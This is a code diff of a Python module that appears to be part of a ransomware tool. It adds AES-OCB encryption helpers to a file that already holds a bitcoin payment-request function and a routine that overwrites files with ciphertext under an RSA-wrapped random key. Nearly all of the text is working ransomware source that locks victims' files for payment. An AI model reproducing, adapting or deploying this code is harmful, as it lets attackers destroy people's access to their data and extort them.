@@ -12,9 +12,11 @@ import time
 import Queue
 import base64
 import urllib
+import StringIO
 import threading
 
 # packages
+import Cryptodome.Cipher.AES
 import Cryptodome.PublicKey.RSA
 import Cryptodome.Cipher.PKCS1_OAEP
 if sys.platform == 'win32':
@@ -22,7 +24,6 @@ if sys.platform == 'win32':
 
 # utilities
 import util
-import security
 
 # globals
 packages = ['_winreg','Cryptodome.PublicKey.RSA','Cryptodome.Cipher.PKCS1_OAEP']
@@ -105,6 +106,44 @@ def request_payment(bitcoin_wallet):
     except Exception as e:
         return "{} error: {}".format(request_payment.func_name, str(e))
 
+def encrypt_aes(plaintext, key, padding=chr(0)):
+    """ 
+    AES-256-OCB encryption
+
+    `Requires`
+    :param str plaintext:   plain text/data
+    :param str key:         session encryption key 
+
+    `Optional`
+    :param str padding:     default: (null byte)
+    
+    Returns encrypted ciphertext as base64-encoded string
+
+    """
+    cipher = Cryptodome.Cipher.AES.new(key, Cryptodome.Cipher.AES.MODE_OCB)
+    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
+    output = b''.join((cipher.nonce, tag, ciphertext))
+    return base64.b64encode(output)
+
+def decrypt_aes(ciphertext, key, padding=chr(0)):
+    """ 
+    AES-256-OCB decryption
+
+    `Requires`
+    :param str ciphertext:  encrypted block of data
+    :param str key:         session encryption key 
+
+    `Optional`
+    :param str padding:     default: (null byte)
+
+    Returns decrypted plaintext as string
+    
+    """
+    data = StringIO.StringIO(base64.b64decode(ciphertext))
+    nonce, tag, ciphertext = [ data.read(x) for x in (Cryptodome.Cipher.AES.block_size - 1, Cryptodome.Cipher.AES.block_size, -1) ]
+    cipher = Cryptodome.Cipher.AES.new(key, Cryptodome.Cipher.AES.MODE_OCB, nonce)
+    return cipher.decrypt_and_verify(ciphertext, tag)
+
 def encrypt_file(filename, rsa_key):
     """ 
     Encrypt a file with AES-256-OCB symmetric encryption
@@ -118,6 +157,7 @@ def encrypt_file(filename, rsa_key):
     :param RsaKey rsa_key:        2048-bit public RSA key
 
     Returns True if succesful, otherwise False
+    
     """
     try:
         if os.path.isfile(filename):
@@ -127,7 +167,7 @@ def encrypt_file(filename, rsa_key):
                     aes_key = os.urandom(32)
                     with open(filename, 'rb') as fp:
                         data = fp.read()
-                    ciphertext = security.encrypt_aes(data, aes_key)
+                    ciphertext = encrypt_aes(data, aes_key)
                     with open(filename, 'wb') as fd:
                         fd.write(ciphertext)
                     key = base64.b64encode(cipher.encrypt(aes_key))
@@ -149,12 +189,13 @@ def decrypt_file(filename, key):
     :param str aes_key:     256-bit key
 
     Returns True if succesful, otherwise False
+
     """
     try:
         if os.path.isfile(filename):
             with open(filename, 'rb') as fp:
                 ciphertext = fp.read()
-            plaintext = security.decrypt_aes(ciphertext, key)
+            plaintext = decrypt_aes(ciphertext, key)
             with open(filename, 'wb') as fd:
                 fd.write(plaintext)
             util.log('{} decrypted'.format(filename))
